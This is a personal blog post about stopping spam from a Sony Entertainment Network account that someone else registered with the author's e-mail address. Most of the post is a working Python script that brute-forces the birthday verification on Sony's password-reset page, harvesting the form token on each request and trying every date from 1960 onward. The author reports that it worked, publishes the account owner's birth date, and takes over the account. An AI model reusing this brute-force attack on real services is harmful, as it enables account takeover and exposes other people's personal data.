---
uid: 770
title: Sony Entertainment Network spam stopper
date: 2015-09-13T00:53:20+00:00
author: fvicente
layout: post
guid: ?p=770
categories:
  - Programming FAQ
  - Software Development
tags:
  - network
  - playstation
  - python
  - sony
  - spam
comments: true
excerpt: How to avoid Sony Entertainment Network e-mail notifications for an account that someone created using your address
---
I don&#8217;t have a Sony PlayStation. But someone nicknamed &#8220;STRONDHA&#8221; has one, and somehow he managed to use my personal e-mail address to create his account. Oddly, Sony didn&#8217;t send any e-mail asking to confirm my e-mail as the owner of the account, and starting spamming every time this person bought a game in their virtual store.

<!--more-->

[<img src="{{ site.baseurl }}/images/sony_spam.png" alt="Sony sending unwanted e-mails"/>]({{ site.baseurl }}/images/sony_spam.png)

## Stop it

My name is too common, and is not the first time I get subscribed to some site I didn&#8217;t ask to. Sometimes, I just click on the &#8220;unsubscribe&#8221; link, or even on &#8220;forgot my password&#8221; and do whatever I need to stop receiving undesired e-mails.

So, I tried the &#8220;forget my password&#8221; trick with Sony, and after some captcha validation, I received an e-mail with a link. The problem is that they required the birthday in order to reset the password, and of course, I don&#8217;t know the birthday of the person that created the account.

Enters python script to try every possible birthday date from 1/1/1960 until today.

### Notes

* You will need to change the base URL to whatever you received in the password reset e-mail from Sony

* You might need to change the &#8216;wrong date&#8217; message to match your local language &#8211; mine is in portuguese (just try any date on the browser, and -unless you&#8217;re so lucky to select the actual birth date- copy and paste the error message on the code)

{% highlight python %}
#!/usr/bin/env python
# -*- coding: utf-8 -*-

import requests
import urllib
import urllib2
import datetime
import sys
import time

from HTMLParser import HTMLParser

# create a subclass and override the handler methods
class MyHTMLParser(HTMLParser):
    def handle_starttag(self, tag, attrs):
        attrs_dict = dict(attrs)
        if tag == "input" and attrs_dict.get('name', '') == "blah_token":
            setattr(self, "value", attrs_dict.get("value"))

    def handle_endtag(self, tag):
        pass

    def handle_data(self, data):
        pass


values = {
    'struts.token.name' : 'blah_token',
    'blah_token': '',
    'verifyType': 'dob',
    'account.dob': '1',
    'account.mob': '1',
    'account.yob': '1980',
}

#
# IMPORTANT: paste the URL received in the change password e-mail in the url variable, the url looks something like this:
# https://account.sonyentertainmentnetwork.com/reg/account/validate-forgot-password-token!input.action?token=***some token here***&request_locale=pt_BR&service-entity=np
#
url = '*** PASTE URL HERE ***'
url_post = "https://account.sonyentertainmentnetwork.com/liquid/reg/account/forgot-password-verify-identity.action"

s = requests.session()
r = s.get(url)
date = datetime.datetime(1960, 1, 1, 1, 1, 1)
today = datetime.datetime.today()
while date < today: 
    date += datetime.timedelta(days=1)
    # find token
    parser = MyHTMLParser()
    parser.feed(r.text)
    if not hasattr(parser, "value"):
        print "!!!!! FOUND %s" % date.isoformat()
        break
    val = getattr(parser, "value")
    print "blah_token = %r" % val
    values['blah_token'] = val
    values['account.dob'] = str(date.day)
    values['account.mob'] = str(date.month)
    values['account.yob'] = str(date.year)
    r = s.post(url_post, values)
    #
    # IMPORTANT: The message is in portuguese, you will need to change this message to match your language
    #
    if u'A data de nascimento inserida é inválida. Verifique a data e tente novamente.' in r.text:
        print "birthday is not %s" % date.isoformat()
    else:
        print "!!!!! FOUND %s" % date.isoformat()
        break
    sys.stdout.flush()
{% endhighlight %}

[See sony.py on gist](https://gist.github.com/fvicente/75980d0d00d759b06e50)

STHRONDHA was born on January 23 of 1983 (or at least that&#8217;s the date he choose when creating his account). So, now I was able to change the password and stop receiving e-mails from Sony. I guess he will need to create a new account now muahahaha.
